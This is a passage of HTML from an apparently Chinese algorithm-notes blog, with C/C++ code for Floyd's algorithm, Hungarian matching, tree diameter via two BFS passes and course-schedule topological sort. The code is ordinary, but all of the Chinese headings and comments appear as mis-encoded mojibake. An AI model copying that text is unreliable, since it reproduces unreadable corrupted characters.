class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">åˆå§‹åŒ–ï¼š<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (i == j) d[i][j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span> d[i][j] = INF;<br><br><span class="hljs-comment">// ç®—æ³•ç»“æŸåï¼Œd[a][b]è¡¨ç¤ºaåˆ°bçš„æœ€çŸ­è·ç¦»</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">floyd</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒˆç‰™åˆ©ç®—æ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n1, n2;     <span class="hljs-comment">// n1è¡¨ç¤ºç¬¬ä¸€ä¸ªé›†åˆä¸­çš„ç‚¹æ•°ï¼Œn2è¡¨ç¤ºç¬¬äºŒä¸ªé›†åˆä¸­çš„ç‚¹æ•°</span><br><span class="hljs-type">int</span> h[N], e[M], ne[M], idx;     <span class="hljs-comment">// é‚»æ¥è¡¨å­˜å‚¨æ‰€æœ‰è¾¹ï¼ŒåŒˆç‰™åˆ©ç®—æ³•ä¸­åªä¼šç”¨åˆ°ä»ç¬¬äºŒä¸ªé›†åˆæŒ‡å‘ç¬¬ä¸€ä¸ªé›†åˆçš„è¾¹ï¼Œæ‰€ä»¥è¿™é‡Œåªç”¨å­˜ä¸€ä¸ªæ–¹å‘çš„è¾¹</span><br><span class="hljs-type">int</span> match[N];       <span class="hljs-comment">// å­˜å‚¨ç¬¬äºŒä¸ªé›†åˆä¸­çš„æ¯ä¸ªç‚¹å½“å‰åŒ¹é…çš„ç¬¬ä¸€ä¸ªé›†åˆä¸­çš„ç‚¹æ˜¯å“ªä¸ª</span><br><span class="hljs-type">bool</span> st[N];     <span class="hljs-comment">// è¡¨ç¤ºç¬¬äºŒä¸ªé›†åˆä¸­çš„æ¯ä¸ªç‚¹æ˜¯å¦å·²ç»è¢«éå†è¿‡</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[x]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-type">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j])<br>        &#123;<br>            st[j] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (match[j] == <span class="hljs-number">0</span> || find(match[j]))<br>            &#123;<br>                match[j] = x;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">// æ±‚æœ€å¤§åŒ¹é…æ•°ï¼Œä¾æ¬¡æšä¸¾ç¬¬ä¸€ä¸ªé›†åˆä¸­çš„æ¯ä¸ªç‚¹èƒ½å¦åŒ¹é…ç¬¬äºŒä¸ªé›†åˆä¸­çš„ç‚¹</span><br><span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i ++ )<br>&#123;<br>    <span class="hljs-built_in">memset</span>(st, <span class="hljs-literal">false</span>, <span class="hljs-keyword">sizeof</span> st);<br>    <span class="hljs-keyword">if</span> (find(i)) res ++ ;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€å°ç“¶é¢ˆè·¯</p><h3 id="ä¾‹é¢˜-7"><a href="#ä¾‹é¢˜-7" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="æ ‘çš„ç›´å¾„"><a href="#æ ‘çš„ç›´å¾„" class="headerlink" title="æ ‘çš„ç›´å¾„"></a>æ ‘çš„ç›´å¾„</h4><p>edges &#x3D; [[0, 1], [1, 2], [1, 3], [2, 4], [3, 5]]</p><p>ç®—æ³•å®ç°</p><ol><li><strong>å‡ºè¾¹æ•°ç»„çš„æ„å»º</strong>ï¼šä½¿ç”¨é‚»æ¥è¡¨ï¼ˆå‡ºè¾¹æ•°ç»„ï¼‰è¡¨ç¤ºæ ‘çš„ç»“æ„ï¼Œæ–¹ä¾¿éå†ã€‚</li><li>ä¸¤æ¬¡ BFS<ul><li>ç¬¬ä¸€æ¬¡ BFS ä»ä»»æ„èŠ‚ç‚¹å‡ºå‘ï¼ˆè¿™é‡Œä»èŠ‚ç‚¹ <code>0</code> å‡ºå‘ï¼‰ï¼Œæ‰¾åˆ°è·ç¦»æœ€è¿œçš„èŠ‚ç‚¹ <code>p</code>ã€‚</li><li>ç¬¬äºŒæ¬¡ BFS ä» <code>p</code> å‡ºå‘ï¼Œæ‰¾åˆ°è·ç¦»æœ€è¿œçš„å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶è¿”å›æ­¤è·ç¦»ä½œä¸ºæ ‘çš„ç›´å¾„ã€‚</li></ul></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to; <span class="hljs-comment">// å‡ºè¾¹æ•°ç»„</span><br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">treeDiameter</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>            n = <span class="hljs-built_in">max</span>(n, <span class="hljs-built_in">max</span>(x, y)); <span class="hljs-comment">// è®¡ç®—æœ€å¤§èŠ‚ç‚¹ç¼–å·</span><br>        &#125;<br>        n++; <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span> ; i&lt;n ; i++)to.<span class="hljs-built_in">push_back</span>(&#123;&#125;); <span class="hljs-comment">//åˆå§‹åŒ–</span><br>        <span class="hljs-comment">// æ„å»ºå‡ºè¾¹æ•°ç»„</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>            to[x].<span class="hljs-built_in">push_back</span>(y);<br>            to[y].<span class="hljs-built_in">push_back</span>(x);<br>        &#125;<br><br>        <span class="hljs-comment">// ä»ä»»æ„èŠ‚ç‚¹ 0 å¼€å§‹ï¼Œæ‰¾åˆ°æœ€è¿œçš„èŠ‚ç‚¹</span><br>        <span class="hljs-type">int</span> p = <span class="hljs-built_in">findFarthest</span>(<span class="hljs-number">0</span>).first;<br>        <span class="hljs-comment">// ä»æ‰¾åˆ°çš„æœ€è¿œèŠ‚ç‚¹ p å†æ¬¡æ‰§è¡Œ BFSï¼Œæ±‚å‡ºæ ‘çš„ç›´å¾„</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">findFarthest</span>(p).second;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// &lt;ç‚¹ï¼Œè·ç¦»&gt;</span><br>    <span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">findFarthest</span><span class="hljs-params">(<span class="hljs-type">int</span> start)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">depth</span><span class="hljs-params">(n, <span class="hljs-number">-1</span>)</span></span>; <span class="hljs-comment">// è®°å½•æ¯ä¸ªèŠ‚ç‚¹çš„æ·±åº¦ï¼Œåˆå§‹ä¸º -1</span><br>        queue&lt;<span class="hljs-type">int</span>&gt; q;<br>        q.<span class="hljs-built_in">push</span>(start);<br>        depth[start] = <span class="hljs-number">0</span>; <span class="hljs-comment">// èµ·å§‹èŠ‚ç‚¹çš„æ·±åº¦ä¸º 0</span><br>        <span class="hljs-comment">// BFS</span><br>        <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>                <span class="hljs-keyword">if</span> (depth[y] != <span class="hljs-number">-1</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// è·³è¿‡å·²è®¿é—®èŠ‚ç‚¹</span><br>                depth[y] = depth[x] + <span class="hljs-number">1</span>; <span class="hljs-comment">// æ›´æ–°æ·±åº¦</span><br>                q.<span class="hljs-built_in">push</span>(y); <span class="hljs-comment">// å°†è¯¥èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// æ‰¾åˆ°è·ç¦»æœ€è¿œçš„èŠ‚ç‚¹</span><br>        <span class="hljs-type">int</span> ans = start;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (depth[i] &gt; depth[ans]) ans = i;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> &#123;ans, depth[ans]&#125;;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="è¯¾ç¨‹è¡¨"><a href="#è¯¾ç¨‹è¡¨" class="headerlink" title="è¯¾ç¨‹è¡¨"></a>è¯¾ç¨‹è¡¨</h4><p>è¾“å…¥: numCourses &#x3D; 2, prerequisites &#x3D; [[1,0],[0,1]]<br>è¾“å‡º: false<br>è§£é‡Š: è¯¾ç¨‹ 1 ä¾èµ–äºè¯¾ç¨‹ 0ï¼Œè¯¾ç¨‹ 0 ä¹Ÿä¾èµ–äºè¯¾ç¨‹ 1ï¼Œå½¢æˆå¾ªç¯ï¼Œæ— æ³•å®Œæˆæ‰€æœ‰è¯¾ç¨‹ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canFinish</span><span class="hljs-params">(<span class="hljs-type">int</span> numCourses, vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;<br>        <span class="hljs-comment">// åˆå§‹åŒ–é‚»æ¥è¡¨å’Œå…¥åº¦è¡¨</span><br>        to = vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;(numCourses, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>        inDeg = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(numCourses, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// æ„å»ºå›¾</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; pre : prerequisites) &#123;<br>            <span class="hljs-type">int</span> ai = pre[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> bi = pre[<span class="hljs-number">1</span>];<br>            to[bi].<span class="hljs-built_in">push_back</span>(ai);<br>            inDeg[ai]++;<br>        &#125;<br>        queue&lt;<span class="hljs-type">int</span>&gt; q;<br>       <span class="hljs-comment">//æ‹“æ‰‘æ’åºç¬¬ä¸€æ­¥:ä»é›¶å…¥åº¦ç‚¹å‡ºå‘</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numCourses; i++) &#123;<br>            <span class="hljs-keyword">if</span> (inDeg[i] == <span class="hljs-number">0</span>) q.<span class="hljs-built_in">push</span>(i);<br>        &#125;<br>        vector&lt;<span class="hljs-type">int</span>&gt; lessons;  <span class="hljs-comment">// ä¿å­˜å®Œæˆçš„è¯¾ç¨‹</span><br>        <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            lessons.<span class="hljs-built_in">push_back</span>(x);<br>            <span class="hljs-comment">// ç¬¬äºŒæ­¥:æ‰©å±•ä¸€ä¸ªç‚¹ï¼Œå‘¨å›´çš„ç‚¹å…¥åº¦å‡ä¸€</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>                inDeg[y]--;<br>                <span class="hljs-keyword">if</span> (inDeg[y] == <span class="hljs-number">0</span>) q.<span class="hljs-built_in">push</span>(y);  <span class="hljs-comment">// ç¬¬ä¸‰æ­¥:å…¥åº¦å‡ä¸º0ï¼Œè¡¨ç¤ºå¯ä»¥å…¥é˜Ÿäº†</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// å¦‚æœæ‰€æœ‰è¯¾ç¨‹éƒ½èƒ½å®Œæˆï¼Œè¿”å›true</span><br>        <span class="hljs-keyword">return</span> lessons.<span class="hljs-built_in">size</span>() == numCourses;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to;   <span class="hljs-comment">// é‚»æ¥è¡¨</span><br>    vector&lt;<span class="hljs-type">int</span>&gt; inDeg;        <span class="hljs-comment">// å…¥åº¦è¡¨</span><br>&#125;;<br><span class="hljs-comment">//è¿™ä¸ªbfså°±ä¸ç”¨åˆ¤é‡äº†ã€‚å› ä¸ºä½ æœ‰äº†indegè¿™ä¸ªä¸œè¥¿å•Šå‡ä¸ºé›¶æ‰ä¼šå…¥é˜Ÿã€‚å¦‚æœè¯´æœ‰ç¯ï¼Œæ˜¯ä¸æ˜¯æ ¹æœ¬å°±å‡ä¸åˆ°é›¶,ä»–ä»¬å°±ä¸ä¼šå»è®¿é—®å•Šï¼Œä¸ä¼šæœ‰é‡å¤ï¼Œæ‰€ä»¥è¯´è¿™é‡Œæˆ‘å°±ä¸ç”¨åˆ¤é‡</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">å‡è®¾è¾“å…¥ï¼š</span><br><span class="hljs-comment">numCourses = 2</span><br><span class="hljs-comment">prerequisites = [[1, 0]]</span><br><span class="hljs-comment">è¿™è¡¨ç¤ºæœ‰ 2 é—¨è¯¾ç¨‹ï¼Œç¼–å·ä¸º 0 å’Œ 1ã€‚è¦å®Œæˆè¯¾ç¨‹ 1ï¼Œä½ å¿…é¡»å…ˆå®Œæˆè¯¾ç¨‹ 0ã€‚</span><br><span class="hljs-comment">æ­¥éª¤ 1ï¼šæ„å»ºå›¾å’Œå…¥åº¦è¡¨</span><br><span class="hljs-comment">é‚»æ¥è¡¨ toï¼šè¿™æ˜¯ä¸€ä¸ªäºŒç»´å‘é‡ï¼Œå…¶ä¸­ to[bi] ä¿å­˜äº†æ‰€æœ‰ä¾èµ–äº bi çš„è¯¾ç¨‹ï¼Œå³ bi çš„åç»­è¯¾ç¨‹ã€‚åœ¨è¯¥ä¾‹ä¸­ï¼š</span><br><span class="hljs-comment">to[0] ä¿å­˜äº†è¯¾ç¨‹ 1ï¼Œå› ä¸ºè¯¾ç¨‹ 1 ä¾èµ–äºè¯¾ç¨‹ 0ã€‚å› æ­¤ï¼Œto[0] = [1]ï¼Œè¡¨ç¤ºä»è¯¾ç¨‹ 0 å¯ä»¥èµ°åˆ°è¯¾ç¨‹ 1ã€‚</span><br><span class="hljs-comment">to[1] æ²¡æœ‰åç»­è¯¾ç¨‹ï¼Œå› æ­¤ to[1] ä¸ºç©ºã€‚</span><br><span class="hljs-comment">å…¥åº¦è¡¨ inDegï¼šè¿™æ˜¯ä¸€ä¸ªä¸€ç»´å‘é‡ï¼Œç”¨æ¥å­˜å‚¨æ¯ä¸ªè¯¾ç¨‹çš„å…¥åº¦ï¼Œå³éœ€è¦å…ˆä¿®å¤šå°‘é—¨è¯¾ç¨‹ã€‚åœ¨è¯¥ä¾‹ä¸­ï¼š</span><br><span class="hljs-comment">è¯¾ç¨‹ 0 æ²¡æœ‰ä»»ä½•ä¾èµ–ï¼Œæ‰€ä»¥ inDeg[0] = 0ã€‚</span><br><span class="hljs-comment">è¯¾ç¨‹ 1 éœ€è¦å…ˆä¿®è¯¾ç¨‹ 0ï¼Œæ‰€ä»¥ inDeg[1] = 1ã€‚</span><br><span class="hljs-comment">æ­¤æ—¶ï¼Œé‚»æ¥è¡¨å’Œå…¥åº¦è¡¨å¦‚ä¸‹ï¼š</span><br><span class="hljs-comment">to = [[1], []]</span><br><span class="hljs-comment">inDeg = [0, 1]</span><br><span class="hljs-comment">æ­¥éª¤ 2ï¼šæ‹“æ‰‘æ’åºå‡†å¤‡</span><br><span class="hljs-comment">æˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ‰€æœ‰å…¥åº¦ä¸º 0 çš„è¯¾ç¨‹ï¼Œä¹Ÿå°±æ˜¯ä¸éœ€è¦å…ˆä¿®è¯¾ç¨‹å°±å¯ä»¥ç›´æ¥å­¦ä¹ çš„è¯¾ç¨‹ã€‚åœ¨è¯¥ä¾‹ä¸­ï¼Œè¯¾ç¨‹ 0 çš„å…¥åº¦ä¸º 0ï¼Œå› æ­¤æˆ‘ä»¬å°†è¯¾ç¨‹ 0 åŠ å…¥é˜Ÿåˆ— qã€‚</span><br><span class="hljs-comment">é˜Ÿåˆ—çŠ¶æ€ï¼š</span><br><span class="hljs-comment">q = [0]</span><br><span class="hljs-comment">æ­¥éª¤ 3ï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰æ‹“æ‰‘æ’åº</span><br><span class="hljs-comment">å¤„ç†è¯¾ç¨‹ 0ï¼š</span><br><span class="hljs-comment">ä»é˜Ÿåˆ—ä¸­å–å‡ºè¯¾ç¨‹ 0 å¹¶å°†å…¶æ ‡è®°ä¸ºå·²å®Œæˆï¼ˆåŠ å…¥ lessons åˆ—è¡¨ï¼‰ã€‚</span><br><span class="hljs-comment">æŸ¥çœ‹è¯¾ç¨‹ 0 çš„æ‰€æœ‰åç»­è¯¾ç¨‹ï¼ˆåœ¨é‚»æ¥è¡¨ to[0] ä¸­æŸ¥æ‰¾ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°è¯¾ç¨‹ 1 ä¾èµ–äºè¯¾ç¨‹ 0ã€‚</span><br><span class="hljs-comment">å‡å°‘è¯¾ç¨‹ 1 çš„å…¥åº¦ï¼ˆinDeg[1]--ï¼‰ï¼Œæ­¤æ—¶è¯¾ç¨‹ 1 çš„å…¥åº¦å˜ä¸º 0ï¼Œè¡¨ç¤ºå¯ä»¥å­¦ä¹ è¯¾ç¨‹ 1ï¼Œå°†å…¶åŠ å…¥é˜Ÿåˆ—ã€‚</span><br><span class="hljs-comment">é˜Ÿåˆ—çŠ¶æ€ï¼š</span><br><span class="hljs-comment">q = [1]</span><br><span class="hljs-comment">lessons = [0]</span><br><span class="hljs-comment">inDeg = [0, 0]</span><br><span class="hljs-comment">å¤„ç†è¯¾ç¨‹ 1ï¼š</span><br><span class="hljs-comment">ä»é˜Ÿåˆ—ä¸­å–å‡ºè¯¾ç¨‹ 1ï¼Œå¹¶å°†å…¶æ ‡è®°ä¸ºå·²å®Œæˆï¼ˆåŠ å…¥ lessons åˆ—è¡¨ï¼‰ã€‚</span><br><span class="hljs-comment">è¯¾ç¨‹ 1 æ²¡æœ‰åç»­è¯¾ç¨‹ï¼Œå› æ­¤é˜Ÿåˆ—å¤„ç†å®Œæ¯•ã€‚</span><br><span class="hljs-comment">é˜Ÿåˆ—çŠ¶æ€ï¼š</span><br><span class="hljs-comment">q = []</span><br><span class="hljs-comment">lessons = [0, 1]</span><br><span class="hljs-comment">æ­¥éª¤ 4ï¼šåˆ¤æ–­ç»“æœ æ‹“æ‰‘æ’åºå®Œæˆåï¼Œlessons åˆ—è¡¨ä¸­åŒ…å«äº†æ‰€æœ‰è¯¾ç¨‹ [0, 1]ï¼Œè¯´æ˜å¯ä»¥å®Œæˆæ‰€æœ‰è¯¾ç¨‹ã€‚ å› æ­¤ï¼Œæœ€ç»ˆè¿”å› trueã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">æ€»ç»“ï¼š è¿™æ®µä»£ç ä½¿ç”¨çš„æ˜¯æ‹“æ‰‘æ’åºç®—æ³•ï¼Œåˆ©ç”¨ BFS æ¥æ£€æµ‹å›¾ä¸­æ˜¯å¦å­˜åœ¨ç¯ï¼š å¦‚æœæ‰€æœ‰è¯¾ç¨‹éƒ½èƒ½åœ¨æ‹“æ‰‘æ’åºä¸­è¢«å¤„ç†ï¼ˆå³ lessons.size() == numCoursesï¼‰ï¼Œè¯´æ˜æ²¡æœ‰å¾ªç¯ä¾èµ–ï¼Œå¯ä»¥å®Œæˆæ‰€æœ‰è¯¾ç¨‹ã€‚ å¦‚æœå­˜åœ¨ç¯ï¼Œåˆ™ä¼šæœ‰ä¸€äº›è¯¾ç¨‹æ— æ³•è¢«å¤„ç†ï¼Œé˜Ÿåˆ—ä¼šæå‰ç»“æŸï¼Œæ­¤æ—¶è¿”å› falseã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="å†—ä½™è¿æ¥"><a href="#å†—ä½™è¿æ¥" class="headerlink" title="å†—ä½™è¿æ¥"></a>å†—ä½™è¿æ¥</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title 